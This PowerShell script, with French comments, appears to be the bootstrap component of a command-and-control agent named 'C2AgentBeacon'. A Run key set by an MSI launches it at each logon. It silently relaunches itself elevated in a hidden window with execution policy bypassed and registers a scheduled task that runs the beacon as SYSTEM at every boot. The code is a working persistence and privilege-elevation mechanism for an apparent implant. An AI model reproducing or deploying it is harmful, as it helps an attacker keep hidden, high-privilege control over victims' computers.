# bootstrap.ps1
# Lance a chaque ouverture de session via HKLM\...\Run (pose par le MSI).
# Role : creer la tache planifiee SYSTEM C2AgentBeacon au tout premier passage.
#  - Si la tache existe deja  -> ne fait rien (aucune invite UAC).
#  - Sinon                    -> s'auto-eleve (1 invite UAC), cree la tache via
#                                register-task.ps1, puis la demarre.
# Une fois la tache creee, l'agent tourne en SYSTEM au demarrage : bootstrap
# n'aura plus jamais besoin de s'elever.

$ErrorActionPreference = 'SilentlyContinue'

$log = Join-Path $env:TEMP 'c2-bootstrap.log'
function W([string]$m) {
    "{0} {1}" -f [DateTime]::Now.ToString('s'), $m | Out-File -FilePath $log -Append -Encoding utf8
}

$taskName = 'C2AgentBeacon'

# 1. La tache existe deja ? -> rien a faire
if (Get-ScheduledTask -TaskName $taskName -TaskPath '\' -ErrorAction SilentlyContinue) {
    W "Task already exists -> nothing to do"
    exit 0
}

# 2. Sommes-nous eleves (administrateur) ?
$isAdmin = ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()
    ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

$registerScript = Join-Path $PSScriptRoot 'register-task.ps1'

if (-not $isAdmin) {
    # 3a. Se relancer eleve -> declenche 1 invite UAC
    W "Not elevated -> relaunching elevated (UAC prompt)"
    try {
        Start-Process -FilePath 'powershell.exe' -Verb RunAs -WindowStyle Hidden -ArgumentList @(
            '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', "`"$PSCommandPath`""
        )
    }
    catch {
        W ("Elevation refused/failed: {0}" -f $_.Exception.Message)
    }
    exit 0
}

# 3b. Ici on est eleve : creer la tache puis la demarrer immediatement
W ("Elevated -> running {0}" -f $registerScript)
& $registerScript
Start-ScheduledTask -TaskName $taskName -TaskPath '\' -ErrorAction SilentlyContinue
W "Bootstrap done"
exit 0
